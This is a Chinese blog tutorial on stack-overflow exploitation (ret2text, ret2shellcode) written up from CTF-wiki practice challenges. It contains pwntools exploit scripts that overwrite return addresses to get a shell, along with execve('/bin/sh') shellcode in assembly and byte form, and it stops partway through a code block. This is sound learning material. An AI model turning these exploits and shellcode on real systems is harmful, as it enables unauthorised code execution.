<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="文明其思想，野蛮其体魄。">
    <meta name="author" content="二十八华生">
    
    <title>
        
            栈溢出漏洞 |
        
        二十八华生的博客
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/bitbug_favicon.6goqr5bioz9c.webp">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/fontawesome.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/regular.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/solid.min.css">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/brands.min.css">
    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"c2yb8er.cn","root":"/","language":"zh-CN","path":"search.xml"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/WanYe.2i8xng3vmthc.webp","favicon":"https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/bitbug_favicon.6goqr5bioz9c.webp","avatar":"https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/WanYe.2i8xng3vmthc.webp","font_size":"15.2px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"文明其思想，||野蛮其体魄。","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":false,"auto":true,"custom_label_list":[]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.5.2"};
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"};
  </script>
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            
                <a class="logo-image" href="/">
                    <img src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/WanYe.2i8xng3vmthc.webp">
                </a>
            
            <a class="logo-title" href="/">
               二十八华生的博客
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/tags"
                            >
                                标签
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/tags">标签</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">

            <div class="article-title">
                <span class="title-hover-animation">栈溢出漏洞</span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230110/WanYe.2i8xng3vmthc.webp">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">二十八华生</span>
                            
                        </div>
                        <div class="meta-info">
                            
<div class="article-meta-info">
    <span class="article-date article-meta-item">
        
            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
        
        <span class="pc">2023-01-12 20:59:24</span>
        <span class="mobile">2023-01-12 20:59</span>
    </span>
    
        <span class="article-update-date article-meta-item">
        <i class="fas fa-file-pen"></i>&nbsp;
        <span class="pc">2023-07-08 01:06:17</span>
    </span>
    
    
        <span class="article-categories article-meta-item">
            <i class="fas fa-folder"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/PWN/">PWN</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E5%81%87%E6%9C%9F%E5%AD%A6%E4%B9%A0/">假期学习</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>5.5k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>22 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content keep-markdown-body">
                <blockquote>
<p>Stack Overflow</p>
</blockquote>
<span id="more"></span>

<h1 id="栈溢出漏洞"><a href="#栈溢出漏洞" class="headerlink" title="栈溢出漏洞"></a>栈溢出漏洞</h1><h2 id="一、基本原理"><a href="#一、基本原理" class="headerlink" title="一、基本原理"></a>一、基本原理</h2><p>​    <strong>栈溢出</strong>指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是:</p>
<ul>
<li>程序必须向栈上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<h2 id="二、基本步骤"><a href="#二、基本步骤" class="headerlink" title="二、基本步骤"></a>二、基本步骤</h2><h3 id="1-寻找危险函数"><a href="#1-寻找危险函数" class="headerlink" title="1.寻找危险函数"></a>1.寻找危险函数</h3><p>​    通过寻找危险函数，我们可以快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下：</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略<code>斜杠0</code></li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li> sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li> strcpy，字符串复制，遇到’\x00’停止</li>
<li> strcat，字符串拼接，遇到’\x00’停止</li>
<li> bcopy</li>
</ul>
</li>
</ul>
<h3 id="2-确定填充长度"><a href="#2-确定填充长度" class="headerlink" title="2.确定填充长度"></a>2.确定填充长度</h3><p>​    这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式:</p>
<ul>
<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
<li>直接地址索引，就相当于直接给定了地址。</li>
</ul>
<p>一般来说，我们会有如下的覆盖需求</p>
<ul>
<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
</ul>
<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
<blockquote>
<p>补充：</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.1tu8pm56pkcg.webp"></p>
</blockquote>
<h2 id="三、基本ROP"><a href="#三、基本ROP" class="headerlink" title="三、基本ROP"></a>三、基本ROP</h2><h3 id="1-介绍及原理"><a href="#1-介绍及原理" class="headerlink" title="1.介绍及原理"></a>1.介绍及原理</h3><p>​    随着 NX 保护（不可执行保护）的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 <strong>ROP(Return Oriented Programming)<strong>，其主要思想是在</strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 <strong>gadgets 就是以 ret 结尾的指令序列</strong>，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
<p>​    之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件：</p>
<ul>
<li>程序存在溢出，并且可以控制返回地址。</li>
<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
</ul>
<p>​    如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
<p>​    —&gt;<strong>pwndbg动态调试</strong></p>
<h3 id="2-ret2text"><a href="#2-ret2text" class="headerlink" title="2.ret2text"></a>2.ret2text</h3><p>​    <strong>ret2text 即控制程序执行程序本身已有的的代码 (.text)。</strong>其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
<p>​    这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关闭保护机制</span><br><span class="line">gcc -m32 -fno-stack-protector -no-pie -o ret2text ret2text.c</span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.4oru3ve9dmrk.webp"></p>
<p>​    编译生成后，我们可以发现：编译器提醒我们gets这个危险函数。可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。主函数中使用了 gets 函数，显然存在栈溢出漏洞。</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.31k6t2djooqo.webp"></p>
<p>​    经过审阅，我们发现了secure函数：</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.4o53a41o13wg.webp"></p>
<h4 id="方法一：ida静态调试寻址"><a href="#方法一：ida静态调试寻址" class="headerlink" title="方法一：ida静态调试寻址"></a>方法一：ida静态调试寻址</h4><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.2u018to3gvcw.webp"></p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.3erkn06nnqps.webp"></p>
<p>构造payload如下：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    c2yb8er = process(<span class="string">&quot;ret2text&quot;</span>)  </span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6C</span>+<span class="number">0x04</span>) + p32(<span class="number">0x080492EE</span>)</span><br><span class="line">    c2yb8er.recvuntil(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>)</span><br><span class="line">    c2yb8er.sendline(payload)</span><br><span class="line">    c2yb8er.interactive()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<p>结果如下：<img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.5qk4718yy6tc.webp"></p>
<p>并没有打通，这并不是说明我们的payload有什么大问题，而可能是静态调试的弊端，即一些gadgets的地址是不准确的，这时候我们就要使用动态调试。</p>
<h4 id="方法二：pwndbg动态寻址"><a href="#方法二：pwndbg动态寻址" class="headerlink" title="方法二：pwndbg动态寻址"></a>方法二：pwndbg动态寻址</h4><p>​    首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.62plbdh2jybk.webp"></p>
<p>​    可以看到该字符串最后的地址就相当于eax此时的地址，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下：</p>
<table>
<thead>
<tr>
<th align="center">eax（s）</th>
<th align="center">0xffffcf8c</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>ebp</strong></td>
<td align="center"><strong>0xffffcff8</strong></td>
</tr>
<tr>
<td align="center"><strong>padding（s与ebp）</strong></td>
<td align="center"><strong>0x6C</strong></td>
</tr>
<tr>
<td align="center"><strong>padding（s与eip）</strong></td>
<td align="center"><strong>0x6C+4</strong></td>
</tr>
</tbody></table>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.2xl7wagoli4g.webp"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    c2yb8er = process(<span class="string">&quot;./ret2text&quot;</span>)  </span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6C</span>+<span class="number">0x04</span>) + p32(<span class="number">0x080492EE</span>)</span><br><span class="line">    c2yb8er.recvuntil(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>)</span><br><span class="line">    c2yb8er.sendline(payload)</span><br><span class="line">    c2yb8er.interactive()</span><br><span class="line">main()	</span><br></pre></td></tr></table></figure>

<p>​    其实如果只是ret2text这里是可以打通的。</p>
<p>​    然后我猛地发现，这偏移不就是我在ida里面的到的偏移么？为什么打不通？？？又到了折磨的找bug环节。</p>
<h4 id="寻找BUG"><a href="#寻找BUG" class="headerlink" title="寻找BUG"></a>寻找BUG</h4><p>感谢HJY哥哥的DEBUG，我后面再慢慢消化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ctf-wiki/ret2text&#x27;</span>)</span><br><span class="line">payload = p32(<span class="number">0x08049296</span>)*<span class="number">25</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">r.sendline(<span class="built_in">str</span>(libc.rand()))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.17qulagpzucg.webp"></p>
<p>成功拿到flag</p>
<h4 id="本应如此"><a href="#本应如此" class="headerlink" title="本应如此"></a>本应如此</h4><p>  一开始是因为ctf-wiki上的题目需要挂梯子才能下载，我懒得挂梯子所以才会拿原题的源码去自己编译生成，后面我自己挂了梯子，去下了原文件开始解题。</p>
<p>​    同样的对于<strong>方法一ida静态调试</strong></p>
<p>​    payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ctf-wiki/wiki原题目/ret2text&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x64</span>+<span class="number">4</span>)+p32(<span class="number">0x804863a</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.1w8w1ucnscbk.webp"></p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.10jzkb76k2sw.webp"></p>
<p>​    但是结果是没跑通然后我们pwndbg动态调试一下看看</p>
<p>​    断点下在<code>080486AE</code>处，即是：<code>b *0x080486AE</code></p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.12ckw1lgf2sg.webp"></p>
<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.6keggnaebjls.webp"></p>
<table>
<thead>
<tr>
<th align="center">esp</th>
<th align="center">0xffffcf50</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>s=esp+0x1C</strong></td>
<td align="center"><strong>0xffffcf6c</strong></td>
</tr>
<tr>
<td align="center"><strong>ebp</strong></td>
<td align="center"><strong>0xffffcfd8</strong></td>
</tr>
<tr>
<td align="center"><strong>padding(s-ebp)</strong></td>
<td align="center"><strong>0x6c</strong></td>
</tr>
<tr>
<td align="center"><strong>padding(s-ret)</strong></td>
<td align="center"><strong>0x6c+4</strong></td>
</tr>
</tbody></table>
<p>payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;/mnt/hgfs/ctf-wiki/wiki原题目/ret2text&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">4</span>)+p32(<span class="number">0x804863a</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230112/%E5%9B%BE%E7%89%87.6ux1ulfsram8.webp"></p>
<p>​    得到flag！</p>
<h3 id="3-ret2shellcode"><a href="#3-ret2shellcode" class="headerlink" title="3.ret2shellcode"></a>3.ret2shellcode</h3><p>​    <strong>ret2shellcode，即控制程序执行 shellcode 代码。</strong>shellcode 指的是<strong>用于完成某个功能的汇编代码</strong>，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p>
<p>​    在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，<strong>shellcode 所在的区域具有可执行权限。</strong></p>
<h4 id="编写shellcode的方法"><a href="#编写shellcode的方法" class="headerlink" title="编写shellcode的方法"></a>编写shellcode的方法</h4><ol>
<li><strong>利用pwntools的shellcraft模块。</strong></li>
</ol>
<p>​        <mark>记得用context设置架构，不然容易报错:</mark></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span>/<span class="string">&#x27;i386&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = shellcraft.sh() <span class="comment">#.sh()就是调用能够满足提权的shellcode,这样返回的是汇编指令</span></span><br><span class="line"><span class="comment"># 要将其转化为机器码</span></span><br><span class="line">shellcode = asm(shellcode)  </span><br></pre></td></tr></table></figure>


 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line"><span class="built_in">print</span>(asm(shellcode))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(asm(shellcode)))</span><br></pre></td></tr></table></figure>

<p>其结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> /* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line"> /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line"> push 0x68</span><br><span class="line"> push 0x732f2f2f</span><br><span class="line"> push 0x6e69622f</span><br><span class="line"> mov ebx, esp</span><br><span class="line"> /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line"> /* push &#x27;sh\x00\x00&#x27; */</span><br><span class="line"> push 0x1010101</span><br><span class="line"> xor dword ptr [esp], 0x1016972</span><br><span class="line"> xor ecx, ecx</span><br><span class="line"> push ecx /* null terminate */</span><br><span class="line"> push 4</span><br><span class="line"> pop ecx</span><br><span class="line"> add ecx, esp</span><br><span class="line"> push ecx /* &#x27;sh\x00&#x27; */</span><br><span class="line"> mov ecx, esp</span><br><span class="line"> xor edx, edx</span><br><span class="line"> /* call execve() */</span><br><span class="line"> push SYS_execve /* 0xb */</span><br><span class="line"> pop eax</span><br><span class="line"> int 0x80</span><br><span class="line"> </span><br><span class="line">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span><br><span class="line">44</span><br></pre></td></tr></table></figure>



<ol start="2">
<li><strong>手动编写更精简的shellcode，有时题目限制了size，就需要自己编写。</strong><ul>
<li>由上面我程序我们可以发现，利用shellcraft生成的提权shellcode的机器码总共有44个字节，当某些题目填充不了44个字节的时候我们就需要自己手动地去编写更精细的shellcode。</li>
</ul>
</li>
</ol>
<ol start="3">
<li><p><strong>64位精简shellcode的编写</strong></p>
<ul>
<li>由于64位采用的是寄存器传参，如果我们要控制参数就必须控制相应的寄存器。</li>
<li>64位传参寄存器依次为：rdi,rsi,rdx,rcx,r8,r9。多余的参数和32位一样，被压入栈中。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">######################################################################</span><br><span class="line">## 64位linux下，默认前6个参数都存入寄存器，所以这里没的说也使用寄存器 </span><br><span class="line">## 寄存器存储参数顺序，参数从左到右：rdi, rsi, rdx, rcx, r8, r9</span><br><span class="line"></span><br><span class="line">	rdi = /bin/sh        ## 第一个参数</span><br><span class="line">	rsi = 0              ## 第二个参数 </span><br><span class="line">	rdx = 0              ## 第三个参数 </span><br><span class="line">	rax = 0x3b           ## 64位下的系统调用号</span><br><span class="line">	syscall              ## 64位使用 syscall</span><br><span class="line">#####################################################################</span><br><span class="line"></span><br><span class="line">## 精炼版本</span><br><span class="line">##</span><br><span class="line">## 这里说明一下，很多博客都会用&quot;/bin//sh&quot;或者官方的&quot;/bin///sh&quot;</span><br><span class="line">## 作为第一个参数，即添加/线来填充空白字符。这里我将&quot;/bin/sh&quot;</span><br><span class="line">## 放在最前面，就不存在汇编代码中间存在空字符截断的问题；另外</span><br><span class="line">## &quot;/bin/sh&quot;是7个字符，64位中需要一行指令，末尾未填充的空字符</span><br><span class="line">## 刚好作为字符串结尾标志符，也就不需要额外压一个空字符入栈。</span><br><span class="line"></span><br><span class="line">    mov rbx, 0x68732f6e69622f  </span><br><span class="line">    push rbx</span><br><span class="line">    push rsp </span><br><span class="line">    pop rdi</span><br><span class="line">    xor esi, esi               </span><br><span class="line">    xor edx, edx             </span><br><span class="line">    push 0x3b</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br><span class="line">    ## 汇编之后字节长度为22字节</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕了很大的圈子，没曾想可以直接这样生成，积累经验！</span></span><br><span class="line"><span class="comment"># 用shellcode相关的pwntools千万不要忘记设置架构！</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)  </span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rbx, 0x68732f6e69622f  </span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rsp </span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi, esi               </span></span><br><span class="line"><span class="string">xor edx, 